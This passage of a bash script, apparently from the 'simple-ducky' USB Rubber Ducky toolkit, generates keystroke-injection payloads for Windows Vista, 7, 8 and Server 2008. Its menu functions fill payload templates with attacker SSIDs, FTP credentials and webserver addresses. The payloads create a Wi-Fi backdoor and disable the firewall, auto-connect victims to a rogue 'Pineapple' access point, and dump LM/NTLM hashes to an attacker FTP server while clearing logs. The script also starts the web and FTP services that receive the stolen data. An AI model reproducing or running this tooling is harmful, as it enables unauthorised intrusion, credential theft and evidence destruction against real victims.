	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard languagee\e[0m"
	echo ""
	sed "/STRING/s/attackerssid/$attackerssid/g" /usr/share/simple-ducky/payloads/wifibackdoorWIN8uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerkey/$attackerkey/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Backdoor w/o UAC (Win 8)
#################################################################################
f_wifibackdoorWIN8nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload opens an Administrative cmd.exe session, then creates a wireless access point and disables the firewall"
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen"
	echo ""
	echo ""
	echo -e ""
	read -p "What would you like the SSID to be? " attackerssid
	echo ""
	read -p "What would you like the AP's key to be? " attackerkey
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard languagee\e[0m"
	echo ""
	sed "/STRING/s/attackerssid/$attackerssid/g" /usr/share/simple-ducky/payloads/wifibackdoorWIN8nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerkey/$attackerkey/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Autoconnect w/UAC (Designed for the WiFi Pineapple | Win Vista/7)
#################################################################################
f_wifiautoconnectVIS7uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m Downloads an xml file from pastebin (using Mubix’ powershell code) and the adds it to the wireless profiles using netsh."
	echo -e "\e[1;31mNote:\e[0m The autoconnect acess point will be set to - Pineapple"
	echo -e "\e[1;31mOptions:\e[0m You might want to change the name of the access point, but you’ll need to upload your own xml. Just modify the 'wifi_autoconnect.con' file in the /usr/share/simple-ducky/payloads/ directory"
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Xcellerator"
	echo -e ""
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	echo
	clear
	cp /usr/share/simple-ducky/payloads/wifiautoconnectVIS7uac.conf /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Autoconnect w/o UAC (Designed for the WiFi Pineapple | Win Vista/7)
#################################################################################
f_wifiautoconnectVIS7nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m Downloads an xml file from pastebin (using Mubix’ powershell code) and the adds it to the wireless profiles using netsh."
	echo -e "\e[1;31mNote:\e[0m The autoconnect acess point will be set to - Pineapple"
	echo -e "\e[1;31mOptions:\e[0m You might want to change the name of the access point, but you’ll need to upload your own xml. Just modify the 'wifi_autoconnect.con' file in the /usr/share/simple-ducky/payloads/ directory"
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Xcellerator"
	echo -e ""
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	cp /usr/share/simple-ducky/payloads/wifiautoconnectVIS7nouac.conf /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Autoconnect w/UAC (Designed for the WiFi Pineapple | Win 8)
#################################################################################
f_wifiautoconnectWIN8uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m Downloads an xml file from pastebin (using Mubix’ powershell code) and the adds it to the wireless profiles using netsh."
	echo -e "\e[1;31mNote:\e[0m The autoconnect acess point will be set to - Pineapple"
	echo -e "\e[1;31mOptions:\e[0m You might want to change the name of the access point, but you’ll need to upload your own xml. Just modify the 'wifi_autoconnect.con' file in the /usr/share/simple-ducky/payloads/ directory"
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Xcellerator"
	echo ""
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	cp /usr/share/simple-ducky/payloads/wifiautoconnectWIN8uac.conf /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Autoconnect w/o UAC (Designed for the WiFi Pineapple | Win 8)
#################################################################################
f_wifiautoconnectWIN8nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m Downloads an xml file from pastebin (using Mubix’ powershell code) and the adds it to the wireless profiles using netsh."
	echo -e "\e[1;31mNote:\e[0m The autoconnect acess point will be set to - Pineapple"
	echo -e "\e[1;31mOptions:\e[0m You might want to change the name of the access point, but you’ll need to upload your own xml. Just modify the 'wifi_autoconnect.con' file in the /usr/share/simple-ducky/payloads/ directory"
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Xcellerator"
	echo ""
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	cp /usr/share/simple-ducky/payloads/wifiautoconnectWIN8nouac.conf /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
#################################################################################
#
# Password Attacks
#
#################################################################################
#################################################################################

#################################################################################
# LM/NTLM Hash Dump From Live System w/UAC (Win Vista/7/Server 2008)
#################################################################################
f_livehashVIS7uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses VSSOwn.vbs (slightly modified) along with Pure-FTPD and 7zip to extract the SAM & SYSTEM file from the victims machine. This payload also clears all the logs from the machine, erasing any history of you being there."
	echo -e "\e[1;31mVSSOwn.vbs link:\e[0m http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs"
	echo -e "\e[1;31m7zip Command Line link:\e[0m http://downloads.sourceforge.net/sevenzip/7za920.zip"
	echo -e "\e[1;31mNote 1:\e[0m I will place 7zip, vssown.vbs, logs.bat in the /var/www/ directory for you. The links above are just for reference."
	echo -e "\e[1;31mNote 2:\e[0m You might get an error stating that ntds.dit doesnt exist. This is because it is only located on Windows servers, so don't worry about it."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7/Server 2008 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo ""echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerftp] " webserverip
	echo ""
	read -p "Please set a password to be for your encrypted zip files. " zippassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/simple-ducky/payloads/livehashVIS7uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload_del5.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del5.txt > /usr/share/simple-ducky/payload_del6.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del6.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	rm /usr/share/simple-ducky/payload_del5.txt
	rm /usr/share/simple-ducky/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	echo -e "\e[1;34mMoving files over to your web directory and starting your web and ftp servers.\e[0m"
	sleep 4
	clear
	cp /usr/share/simple-ducky/misc/7za.exe /var/www/7za.exe
	clear
	service apache2 restart
	clear
	service pure-ftpd restart
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# LM/NTLM Hash Dump From Live System w/o UAC (Win Vista/7/Server 2008)
#################################################################################
f_livehashVIS7nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses VSSOwn.vbs (slightly modified) along with Pure-FTPD and 7zip to extract the SAM & SYSTEM file from the victims machine. This payload also clears all the logs from the machine, erasing any history of you being there."
	echo -e "\e[1;31mVSSOwn.vbs link:\e[0m http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs"
	echo -e "\e[1;31m7zip Command Line link:\e[0m http://downloads.sourceforge.net/sevenzip/7za920.zip"
	echo -e "\e[1;31mNote 1:\e[0m I will place 7zip, vssown.vbs, logs.bat in the /var/www/ directory for you. The links above are just for reference."
	echo -e "\e[1;31mNote 2:\e[0m You might get an error stating that ntds.dit doesnt exist. This is because it is only located on Windows servers, so don't worry about it."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7/Server 2008 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo ""echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerftp] " webserverip
	echo ""
	read -p "Please set a password to be for your encrypted zip files. " zippassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/simple-ducky/payloads/livehashVIS7nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload_del5.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del5.txt > /usr/share/simple-ducky/payload_del6.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del6.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	rm /usr/share/simple-ducky/payload_del5.txt
	rm /usr/share/simple-ducky/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	echo -e "\e[1;34mMoving files over to your web directory and starting your web and ftp servers.\e[0m"
	sleep 4
	clear
	cp /usr/share/simple-ducky/misc/7za.exe /var/www/7za.exe
	clear
	service apache2 restart
	clear
	service pure-ftpd restart
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# LM/NTLM Hash Dump From Live System w/UAC (Windows 8)
#################################################################################
f_livehashWIN8uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses VSSOwn.vbs (slightly modified) along with Pure-FTPD and 7zip to extract the SAM & SYSTEM file from the victims machine. This payload also clears all the logs from the machine, erasing any history of you being there."
	echo -e "\e[1;31mVSSOwn.vbs link:\e[0m http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs"
	echo -e "\e[1;31m7zip Command Line link:\e[0m http://downloads.sourceforge.net/sevenzip/7za920.zip"
	echo -e "\e[1;31mNote 1:\e[0m I will place 7zip, vssown.vbs, logs.bat in the /var/www/ directory for you. The links above are just for reference."
	echo -e "\e[1;31mNote 2:\e[0m You might get an error stating that ntds.dit doesnt exist. This is because it is only located on Windows servers, so don't worry about it."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo ""echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerftp] " webserverip
	echo ""
	read -p "Please set a password to be for your encrypted zip files. " zippassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/simple-ducky/payloads/livehashWIN8uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload_del5.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del5.txt > /usr/share/simple-ducky/payload_del6.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del6.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	rm /usr/share/simple-ducky/payload_del5.txt
	rm /usr/share/simple-ducky/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	echo -e "\e[1;34mMoving files over to your web directory and starting your web and ftp servers.\e[0m"
	sleep 4
	clear
	cp /usr/share/simple-ducky/misc/7za.exe /var/www/7za.exe
	clear
	service apache2 restart
	clear
	service pure-ftpd restart
	clear
	xdg-open /usr/share/simple-ducky/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# LM/NTLM Hash Dump From Live System w/o UAC (Windows 8)
#################################################################################
f_livehashWIN8nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses VSSOwn.vbs (slightly modified) along with Pure-FTPD and 7zip to extract the SAM & SYSTEM file from the victims machine. This payload also clears all the logs from the machine, erasing any history of you being there."
	echo -e "\e[1;31mVSSOwn.vbs link:\e[0m http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs"
	echo -e "\e[1;31m7zip Command Line link:\e[0m http://downloads.sourceforge.net/sevenzip/7za920.zip"
	echo -e "\e[1;31mNote 1:\e[0m I will place 7zip, vssown.vbs, logs.bat in the /var/www/ directory for you. The links above are just for reference."
	echo -e "\e[1;31mNote 2:\e[0m You might get an error stating that ntds.dit doesnt exist. This is because it is only located on Windows servers, so don't worry about it."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo ""echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerftp] " webserverip
	echo ""
	read -p "Please set a password to be for your encrypted zip files. " zippassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/simple-ducky/payloads/livehashWIN8nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload_del5.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del5.txt > /usr/share/simple-ducky/payload_del6.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/simple-ducky/payload_del6.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
